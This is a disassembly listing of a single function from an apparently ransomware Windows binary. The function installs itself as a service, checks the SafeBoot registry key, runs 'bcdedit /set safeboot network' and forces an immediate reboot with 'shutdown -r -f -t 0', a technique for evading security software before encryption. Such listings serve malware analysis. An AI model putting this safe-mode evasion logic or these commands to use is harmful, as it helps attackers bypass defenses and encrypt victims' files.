.text:001DC5A0 sub_1DC5A0 proc near                    ; CODE XREF: _main:loc_1EDB95↓p
.text:001DC5A0
.text:001DC5A0 ServiceStartTable= SERVICE_TABLE_ENTRYW ptr -40h
.text:001DC5A0 var_38= dword ptr -38h
.text:001DC5A0 var_34= dword ptr -34h
.text:001DC5A0 var_30= dword ptr -30h
.text:001DC5A0 phkResult= dword ptr -2Ch
.text:001DC5A0 var_28= dword ptr -28h
.text:001DC5A0 var_10= dword ptr -10h
.text:001DC5A0 var_C= byte ptr -0Ch
.text:001DC5A0 var_4= dword ptr -4
.text:001DC5A0 arg_4= dword ptr  0Ch
.text:001DC5A0
.text:001DC5A0 ; FUNCTION CHUNK AT .text:00231DB0 SIZE 00000028 BYTES
.text:001DC5A0 ; FUNCTION CHUNK AT .text:00231DDD SIZE 00000027 BYTES
.text:001DC5A0
.text:001DC5A0 ; __unwind { // SEH_40C5A0
.text:001DC5A0 push    ebp
.text:001DC5A1 mov     ebp, esp
.text:001DC5A3 push    0FFFFFFFFh
.text:001DC5A5 push    offset SEH_40C5A0
.text:001DC5AA mov     eax, large fs:0
.text:001DC5B0 push    eax
.text:001DC5B1 sub     esp, 34h
.text:001DC5B4 mov     eax, ___security_cookie
.text:001DC5B9 xor     eax, ebp
.text:001DC5BB mov     [ebp+var_10], eax
.text:001DC5BE push    esi
.text:001DC5BF push    edi
.text:001DC5C0 push    eax
.text:001DC5C1 lea     eax, [ebp+var_C]
.text:001DC5C4 mov     large fs:0, eax
.text:001DC5CA push    offset aEncryption              ; "ENCRYPTION"
.text:001DC5CF push    offset unk_259670
.text:001DC5D4 call    sub_1D26D0
.text:001DC5D9 mov     esi, eax
.text:001DC5DB add     esp, 8
.text:001DC5DE mov     ecx, [esi]
.text:001DC5E0 push    0Ah
.text:001DC5E2 mov     ecx, [ecx+4]
.text:001DC5E5 add     ecx, esi
.text:001DC5E7 call    sub_1ED330
.text:001DC5EC movzx   ecx, al
.text:001DC5EF push    ecx
.text:001DC5F0 mov     ecx, esi
.text:001DC5F2 call    sub_1EAB20
.text:001DC5F7 mov     ecx, esi
.text:001DC5F9 call    sub_1E76E0
.text:001DC5FE cmp     dword_257290, 8
.text:001DC605 mov     eax, offset lpServiceName
.text:001DC60A mov     [ebp+ServiceStartTable.lpServiceProc], offset sub_1DFE80
.text:001DC611 cmovnb  eax, lpServiceName
.text:001DC618 mov     [ebp+ServiceStartTable.lpServiceName], eax
.text:001DC61B lea     eax, [ebp+ServiceStartTable]
.text:001DC61E push    eax                             ; lpServiceStartTable
.text:001DC61F mov     [ebp+var_38], 0
.text:001DC626 mov     [ebp+var_34], 0
.text:001DC62D call    ds:StartServiceCtrlDispatcherW
.text:001DC633 test    eax, eax
.text:001DC635 jnz     loc_1DC8B0
.text:001DC63B push    0F003Fh                         ; dwDesiredAccess
.text:001DC640 push    eax                             ; lpDatabaseName
.text:001DC641 push    eax                             ; lpMachineName
.text:001DC642 call    ds:OpenSCManagerW
.text:001DC648 mov     esi, eax
.text:001DC64A test    esi, esi
.text:001DC64C jnz     short loc_1DC69E
.text:001DC64E mov     esi, ds:GetLastError
.text:001DC654 call    esi ; GetLastError
.text:001DC656 cmp     eax, 5
.text:001DC659 jnz     short loc_1DC66F
.text:001DC65B push    offset aPleaseRunProgr          ; "Please run program as admin"
.text:001DC660 push    offset unk_259670
.text:001DC665 call    sub_1D26D0
.text:001DC66A add     esp, 8
.text:001DC66D jmp     short loc_1DC68B
.text:001DC66F ; ---------------------------------------------------------------------------
.text:001DC66F
.text:001DC66F loc_1DC66F:                             ; CODE XREF: sub_1DC5A0+B9↑j
.text:001DC66F call    esi ; GetLastError
.text:001DC671 push    eax
.text:001DC672 push    offset aCantOpenScmMan          ; "Cant open scm manager: "
.text:001DC677 push    offset unk_259670               ; int
.text:001DC67C call    sub_1D26D0
.text:001DC681 add     esp, 8
.text:001DC684 mov     ecx, eax
.text:001DC686 call    sub_1DA700
.text:001DC68B
.text:001DC68B loc_1DC68B:                             ; CODE XREF: sub_1DC5A0+CD↑j
.text:001DC68B push    offset sub_1D4910
.text:001DC690 mov     ecx, eax
.text:001DC692 call    sub_1DA8D0
.text:001DC697 push    0                               ; FileName
.text:001DC699 call    __loaddll
.text:001DC69E
.text:001DC69E loc_1DC69E:                             ; CODE XREF: sub_1DC5A0+AC↑j
.text:001DC69E call    sub_1DF650
.text:001DC6A3 sub     esp, 18h
.text:001DC6A6 mov     ecx, esp
.text:001DC6A8 mov     [ebp+phkResult], esp
.text:001DC6AB push    offset xmmword_2571D4           ; int
.text:001DC6B0 call    sub_1D6BD0
.text:001DC6B5 ;   try {
.text:001DC6B5 mov     [ebp+var_4], 0
.text:001DC6BC sub     esp, 18h
.text:001DC6BF mov     ecx, esp
.text:001DC6C1 mov     [ebp+var_30], esp
.text:001DC6C4 push    offset lpServiceName            ; Src
.text:001DC6C9 call    sub_1D6BD0
.text:001DC6C9 ;   } // starts at 1DC6B5
.text:001DC6CE ;   try {
.text:001DC6CE mov     byte ptr [ebp+var_4], 1
.text:001DC6D2 push    esi                             ; hSCManager
.text:001DC6D2 ;   } // starts at 1DC6CE
.text:001DC6D3 mov     [ebp+var_4], 0FFFFFFFFh
.text:001DC6DA call    sub_1DC8E0
.text:001DC6DF add     esp, 34h
.text:001DC6E2 test    eax, eax
.text:001DC6E4 jz      loc_1DC87D
.text:001DC6EA push    43h ; 'C'                       ; nIndex
.text:001DC6EC call    ds:GetSystemMetrics
.text:001DC6F2 mov     edi, eax
.text:001DC6F4 push    edi
.text:001DC6F5 push    offset aBootOption              ; "Boot option: "
.text:001DC6FA push    offset unk_259670
.text:001DC6FF call    sub_1D26D0
.text:001DC704 add     esp, 8
.text:001DC707 mov     ecx, eax
.text:001DC709 call    sub_1DA530
.text:001DC70E mov     esi, eax
.text:001DC710 push    0Ah
.text:001DC712 mov     ecx, [esi]
.text:001DC714 mov     ecx, [ecx+4]
.text:001DC717 add     ecx, esi
.text:001DC719 call    sub_1ED330
.text:001DC71E movzx   ecx, al
.text:001DC721 push    ecx
.text:001DC722 mov     ecx, esi
.text:001DC724 call    sub_1EAB20
.text:001DC729 mov     ecx, esi
.text:001DC72B call    sub_1E76E0
.text:001DC730 test    edi, edi
.text:001DC732 jnz     loc_1DC858
.text:001DC738 lea     eax, [ebp+phkResult]
.text:001DC73B push    eax                             ; int
.text:001DC73C push    103h                            ; int
.text:001DC741 push    edi                             ; int
.text:001DC742 push    offset SubKey                   ; "SYSTEM\\CurrentControlSet\\Control\\Saf"...
.text:001DC747 push    80000002h                       ; int
.text:001DC74C call    ds:RegOpenKeyExW
.text:001DC752 test    eax, eax
.text:001DC754 jnz     loc_1DC843
.text:001DC75A sub     esp, 18h
.text:001DC75D mov     ecx, esp
.text:001DC75F mov     [ebp+var_30], esp
.text:001DC762 push    offset lpServiceName            ; Src
.text:001DC767 call    sub_1D6BD0
.text:001DC76C ;   try {
.text:001DC76C mov     [ebp+var_4], 2
.text:001DC773 push    [ebp+phkResult]                 ; hKey
.text:001DC773 ;   } // starts at 1DC76C
.text:001DC776 mov     [ebp+var_4], 0FFFFFFFFh
.text:001DC77D call    sub_1DCEE0
.text:001DC782 add     esp, 1Ch
.text:001DC785 test    al, al
.text:001DC787 jz      loc_1DC81E
.text:001DC78D push    offset aBcdeditSetSafe          ; "bcdedit /set safeboot network"
.text:001DC792 call    sub_20DC04
.text:001DC797 push    offset aCWindowsSystem          ; "C:\\Windows\\System32\\bcdedit.exe /set"...
.text:001DC79C call    sub_20DC04
.text:001DC7A1 push    offset aCWindowsSysnat          ; "C:\\Windows\\SysNative\\bcdedit.exe /se"...
.text:001DC7A6 call    sub_20DC04
.text:001DC7AB lea     eax, [ebp+var_28]
.text:001DC7AE push    eax                             ; int
.text:001DC7AF call    sub_1DFCB0
.text:001DC7B4 add     esp, 10h
.text:001DC7B7 ;   try {
.text:001DC7B7 mov     [ebp+var_4], 3
.text:001DC7BE mov     ecx, offset unk_257294
.text:001DC7C3 push    eax                             ; int
.text:001DC7C4 call    sub_1DA440
.text:001DC7C4 ;   } // starts at 1DC7B7
.text:001DC7C9 mov     [ebp+var_4], 0FFFFFFFFh
.text:001DC7D0 lea     ecx, [ebp+var_28]               ; void *
.text:001DC7D3 call    sub_1D9620
.text:001DC7D8 sub     esp, 18h
.text:001DC7DB mov     ecx, esp
.text:001DC7DD mov     [ebp+var_30], esp
.text:001DC7E0 push    offset unk_257294               ; Src
.text:001DC7E5 call    sub_1D6BD0
.text:001DC7EA ;   try {
.text:001DC7EA mov     [ebp+var_4], 4
.text:001DC7EA ;   } // starts at 1DC7EA
.text:001DC7F1 mov     [ebp+var_4], 0FFFFFFFFh
.text:001DC7F8 call    sub_1E0280
.text:001DC7FD add     esp, 18h
.text:001DC800 push    edi                             ; nShowCmd
.text:001DC801 push    edi                             ; lpDirectory
.text:001DC802 push    offset Parameters               ; "/C shutdown -r -f -t 0"
.text:001DC807 push    offset File                     ; "cmd.exe"
.text:001DC80C push    offset Operation                ; "open"
.text:001DC811 push    edi                             ; hwnd
.text:001DC812 call    ds:ShellExecuteA
.text:001DC818 push    edi                             ; FileName
.text:001DC819 call    __loaddll
.text:001DC81E
.text:001DC81E loc_1DC81E:                             ; CODE XREF: sub_1DC5A0+1E7↑j
.text:001DC81E push    offset sub_1D4910
.text:001DC823 push    offset aErrorWhileAddi          ; "Error while adding service to autostart"
.text:001DC828 push    offset unk_259670
.text:001DC82D call    sub_1D26D0
.text:001DC832 add     esp, 8
.text:001DC835 mov     ecx, eax
.text:001DC837 call    sub_1DA8D0
.text:001DC83C push    0                               ; FileName
.text:001DC83E call    __loaddll
.text:001DC843
.text:001DC843 loc_1DC843:                             ; CODE XREF: sub_1DC5A0+1B4↑j
.text:001DC843 push    2E0h
.text:001DC848 push    eax                             ; dwMessageId
.text:001DC849 call    sub_1DEA60
.text:001DC84E add     esp, 8
.text:001DC851 push    0                               ; FileName
.text:001DC853 call    __loaddll
.text:001DC858
.text:001DC858 loc_1DC858:                             ; CODE XREF: sub_1DC5A0+192↑j
.text:001DC858 push    offset sub_1D4910
.text:001DC85D push    offset aThisProgramNee          ; "This program need to be service"
.text:001DC862 push    offset unk_259670
.text:001DC867 call    sub_1D26D0
.text:001DC86C add     esp, 8
.text:001DC86F mov     ecx, eax
.text:001DC871 call    sub_1DA8D0
.text:001DC876 push    0                               ; FileName
.text:001DC878 call    __loaddll
.text:001DC87D
.text:001DC87D loc_1DC87D:                             ; CODE XREF: sub_1DC5A0+144↑j
.text:001DC87D push    offset sub_1D4910
.text:001DC882 call    ds:GetLastError
.text:001DC888 push    eax
.text:001DC889 push    offset aErrorWhileCrea          ; "Error while creating service: "
.text:001DC88E push    offset unk_259670
.text:001DC893 call    sub_1D26D0
.text:001DC898 add     esp, 8
.text:001DC89B mov     ecx, eax
.text:001DC89D call    sub_1DA700
.text:001DC8A2 mov     ecx, eax
.text:001DC8A4 call    sub_1DA8D0
.text:001DC8A9 push    0                               ; FileName
.text:001DC8AB call    __loaddll
.text:001DC8B0
.text:001DC8B0 loc_1DC8B0:                             ; CODE XREF: sub_1DC5A0+95↑j
.text:001DC8B0 push    offset sub_1D4910
.text:001DC8B5 push    offset aStartedAsServi          ; "started as service"
.text:001DC8BA push    offset unk_259670
.text:001DC8BF call    sub_1D26D0
.text:001DC8C4 add     esp, 8
.text:001DC8C7 mov     ecx, eax
.text:001DC8C9 call    sub_1DA8D0
.text:001DC8CE push    0                               ; FileName
.text:001DC8D0 call    __loaddll
.text:001DC8D0 ; } // starts at 1DC5A0
.text:001DC8D0 sub_1DC5A0 endp ; sp-analysis failed
.text:001DC8D0